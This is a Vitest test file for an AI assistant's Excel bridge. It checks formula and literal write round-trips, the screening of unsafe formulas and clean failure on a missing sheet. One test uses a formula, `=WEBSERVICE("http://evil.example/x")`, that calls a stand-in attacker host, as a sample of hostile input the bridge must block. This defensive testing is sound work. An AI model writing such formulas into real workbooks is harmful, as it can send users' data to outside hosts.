// @vitest-environment jsdom
import { describe, it, expect, afterEach } from 'vitest';
import {
  installFakeExcel,
  excelSeed,
  scriptedClient,
  mountStack,
  type ExcelSimulator,
  type MountedStack,
} from '../test-harness/index.js';

/**
 * FULL-STACK interplay: bridge-excel + runtime + web-shell over the in-memory Excel host.
 *
 * Track: excel-types-roundtrip. The existing `excel-integration.test.ts` proves that an approved
 * write lands and that the composed-read pipeline computes the right total. This file targets the
 * DISTINCT seam the formula-first write contract (ADR-0003 element 3, CLAUDE.md "reversible,
 * provenanced writes") is really about: a write must preserve a cell's *kind* — a FORMULA is routed
 * to `range.formulas` (Excel evaluates it; the cell keeps the inspectable `=…` text) while a literal
 * number/date is routed to `range.values`. The bridge must NOT collapse a formula into its display
 * value, nor a literal into a formula. We then READ THE WORKBOOK BACK through the same fake host and
 * assert each cell's stored representation is distinct.
 *
 * We drive the REAL stack — `selectBridge('excel')` → real `AssistSession` (scripted client) → real
 * `PanelController` → rendered `<App/>` — and mock only the two outer boundaries: the Excel HOST (the
 * in-memory `installFakeExcel` simulator, which records a formula write into `range.formulas` and a
 * literal write into `range.values`, verbatim, exactly as the real host's two write paths do) and the
 * model NETWORK (the scripted SSE client). Everything in between is real: real grammar/parser, real
 * `compileCommand` → `write-cells` request, real plan dry-run + approval gate, real
 * `ExcelBridge.applyWriteCells` with its `splitFormulaGrid` routing, real provenance persistence.
 *
 * The seam assertions are OBSERVABLE host reads after the run:
 *   1. types/formulas roundtrip — a formula cell reads back as its `=…` TEXT (not a display value),
 *      while sibling literal cells read back as their number/date values, all from ONE approved plan.
 *   2. a stale/absent address — a `set` against a worksheet that no longer exists yields a CLEAN
 *      conflict (`actuate_failed`) surfaced in the run transcript, with the workbook left intact
 *      (no corrupt partial write anywhere), rather than a throw or a garbage cell.
 */

let sim: ExcelSimulator | undefined;
let ui: MountedStack | undefined;

afterEach(() => {
  ui?.unmount();
  sim?.restore();
  ui = undefined;
  sim = undefined;
});

/**
 * A small, typed workbook: a `Data` sheet whose header row labels four columns (qty/unit are the
 * numeric inputs a formula sums; due is a date column), plus an empty `Out` sheet the writes land
 * in so the assertions read back fresh cells rather than seeded ones.
 */
function typedSeed(): ReturnType<typeof excelSeed> {
  return excelSeed({
    sheets: [
      {
        name: 'Data',
        origin: 'A1',
        values: [
          ['item', 'qty', 'unit', 'due'],
          ['widget', '4', '25', '2026-01-15'],
          ['gadget', '2', '50', '2026-02-20'],
          ['sprocket', '6', '10', '2026-03-10'],
        ],
      },
      {
        name: 'Out',
        origin: 'A1',
        values: [
          ['label', 'cell'],
          ['', ''],
          ['', ''],
          ['', ''],
        ],
      },
    ],
    activeSheet: 'Data',
    selection: 'Data!A2:D2',
  });
}

describe('Excel typed write roundtrip (full-stack interplay: bridge-excel + runtime)', () => {
  it('a formula, a number, and a date written in ONE plan roundtrip as DISTINCT cell kinds', async () => {
    sim = installFakeExcel(typedSeed());
    // One ```cmd block ⇒ ONE plan with three `set` effects. The runtime compiles each `set` into a
    // `write-cells` request; the bridge's `splitFormulaGrid` routes the `=`-cell to `range.formulas`
    // and the literals to `range.values`. The fake host records each path verbatim, so reading the
    // workbook back lets us prove the formula stayed a formula (NOT its computed display value).
    ui = mountStack({
      surface: 'excel',
      client: scriptedClient([
        [
          '```cmd',
          'set Out!B2 =SUM(Data!B2:B4)',
          'set Out!B3 12',
          'set Out!B4 2026-06-24',
          '```',
        ].join('\n'),
        '```cmd\ndone\n```',
      ]),
    });
    await ui!.flush();

    let run!: Promise<void>;
    await ui!.act(() => {
      run = ui!.controller.runCommands('summarize the quantities and stamp a due date');
    });
    await ui!.waitFor((s) => s.pendingPlan !== undefined);

    // The plan-approval card shows all three effects with their VERBATIM command lines — crucially the
    // formula is shown as `=SUM(...)`, the auditable text, never a pre-evaluated number.
    const plan = ui!.container.querySelector('.plan-approval');
    expect(plan).not.toBeNull();
    expect(plan?.querySelectorAll('.plan-effect').length).toBe(3);
    const planText = plan?.textContent ?? '';
    expect(planText).toContain('set Out!B2 =SUM(Data!B2:B4)');
    expect(planText).toContain('set Out!B3 12');
    expect(planText).toContain('set Out!B4 2026-06-24');

    await ui!.act(() => ui!.controller.approvePlan());
    await ui!.waitFor((s) => !s.busy);
    await run;
    await ui!.flush();

    // ── READ THE WORKBOOK BACK and assert distinct cell kinds ──────────────────────────────────
    const out = sim.snapshot().sheets.find((s) => s.name === 'Out');
    expect(out).toBeDefined();
    // Out!B2 = a FORMULA: the cell holds the inspectable `=SUM(...)` text, NOT a computed display
    // value (the fake never evaluates; the bridge routed it to `.formulas`, preserving the formula).
    // 'Out' origin is A1, so row index 1 = row 2, col index 1 = column B.
    const b2 = out?.values[1]?.[1];
    expect(b2).toBe('=SUM(Data!B2:B4)');
    expect(String(b2).startsWith('=')).toBe(true); // it is a formula, not a literal display value.
    expect(b2).not.toBe('12'); // and emphatically not the evaluated sum (4+2+6 = 12).

    // Out!B3 = a NUMBER literal: routed to `.values`, stored verbatim, NOT prefixed with `=`.
    const b3 = out?.values[2]?.[1];
    expect(b3).toBe('12');
    expect(String(b3).startsWith('=')).toBe(false);

    // Out!B4 = a DATE literal: routed to `.values` distinctly from the formula path, kept verbatim
    // (a date string is data, not a formula) — it must not be mistaken for active content.
    const b4 = out?.values[3]?.[1];
    expect(b4).toBe('2026-06-24');
    expect(String(b4).startsWith('=')).toBe(false);

    // The seeded inputs the formula references are untouched by the write (no clobber of the source).
    const data = sim.snapshot().sheets.find((s) => s.name === 'Data');
    expect(data?.values[1]?.[1]).toBe('4'); // Data!B2 still the original qty.

    // Each landed write is durably provenanced into the workbook settings bag (the signed-in user).
    expect(sim.office.settings.size).toBeGreaterThan(0);
    const record = [...sim.office.settings.values()].map(String).join('|');
    expect(record).toContain('sim.user@acme');

    // The run transcript narrates three APPLIED writes (not degraded / not failed).
    const steps = ui!.container.querySelector('.run-steps')?.textContent ?? '';
    expect(steps).toContain('applied');
    expect(steps).not.toContain('prepare_failed');
  });

  it('an active-content formula is NEVER evaluated: the whole typed write degrades clean', async () => {
    // A `=WEBSERVICE(...)` cell is an exfiltration vector. The bridge must refuse to route it into
    // `range.formulas` (which would let Excel fetch a URL the model chose) and degrade the write —
    // proving the formula path screens untrusted active content rather than blindly preserving it.
    sim = installFakeExcel(typedSeed());
    ui = mountStack({
      surface: 'excel',
      client: scriptedClient([
        '```cmd\nset Out!B2 =WEBSERVICE("http://evil.example/x")\n```',
        '```cmd\ndone\n```',
      ]),
    });
    await ui!.flush();

    let run!: Promise<void>;
    await ui!.act(() => {
      run = ui!.controller.runCommands('pull a value from the web');
    });
    await ui!.waitFor((s) => s.pendingPlan !== undefined);
    await ui!.act(() => ui!.controller.approvePlan());
    await ui!.waitFor((s) => !s.busy);
    await run;
    await ui!.flush();

    // The cell was NOT written: no formula, no value — the active-content formula was screened off.
    const out = sim.snapshot().sheets.find((s) => s.name === 'Out');
    expect(out?.values[1]?.[1] ?? '').toBe('');
    // No provenance for a degraded (non-landed) write.
    expect(
      [...sim.office.settings.keys()].filter((key) => !key.startsWith('ge:recovery:')),
    ).toHaveLength(0);
    // The transcript narrates the refusal by its error code (`unsafe_formula`) — a reviewable,
    // non-silent outcome, NOT an applied write. (The result is `ok:false, degraded:true`; the run
    // step surfaces the error code for a non-ok result, which is the user-facing reason.)
    const steps = ui!.container.querySelector('.run-steps')?.textContent ?? '';
    expect(steps).toContain('unsafe_formula');
    expect(steps).not.toContain('applied');
  });

  it('a write to an address that no longer exists is a CLEAN conflict, not a corrupt write', async () => {
    sim = installFakeExcel(typedSeed());
    // `set Ghost!A1 42` targets a worksheet that is not in the workbook. At apply-time the bridge
    // calls `worksheets.getItem('Ghost')`, which the host rejects (no such sheet). The runtime's
    // `applyRequest` catches the throw and returns a clean `actuate_failed` ActuationResult — a
    // conflict surfaced to the UI, NOT a thrown loop and NOT a partial/garbage write landing in some
    // other cell. The second `set` (to a real cell) shares the same plan to prove the failure of one
    // effect is isolated and the rest of the workbook stays coherent.
    ui = mountStack({
      surface: 'excel',
      client: scriptedClient(['```cmd\nset Ghost!A1 42\nset Out!B2 7\n```', '```cmd\ndone\n```']),
    });
    await ui!.flush();

    let run!: Promise<void>;
    await ui!.act(() => {
      run = ui!.controller.runCommands('write into a missing sheet and a real one');
    });
    await ui!.waitFor((s) => s.pendingPlan !== undefined);
    await ui!.act(() => ui!.controller.approvePlan());
    await ui!.waitFor((s) => !s.busy);
    await run;
    await ui!.flush();

    const snap = sim.snapshot();
    // No `Ghost` sheet was conjured; the workbook still has exactly its two seeded sheets.
    expect(snap.sheets.map((s) => s.name).sort()).toEqual(['Data', 'Out']);
    // No corrupt write leaked: the seeded data is intact and `42` landed in NO cell anywhere.
    const allCells = snap.sheets.flatMap((s) => s.values.flat());
    expect(allCells).not.toContain('42');
    // The isolated, valid sibling write DID land (Out!B2 = '7'), proving the failure was contained
    // to the bad effect rather than poisoning the whole plan's actuation.
    const out = snap.sheets.find((s) => s.name === 'Out');
    expect(out?.values[1]?.[1]).toBe('7');

    // The conflict surfaced cleanly in the run transcript as `actuate_failed` — a reviewable
    // outcome, not an exception that tore down the loop.
    const steps = ui!.container.querySelector('.run-steps')?.textContent ?? '';
    expect(steps).toContain('prepare_failed');
    // And the good write narrated as applied — the loop kept running past the conflict.
    expect(steps).toContain('applied');
  });
});
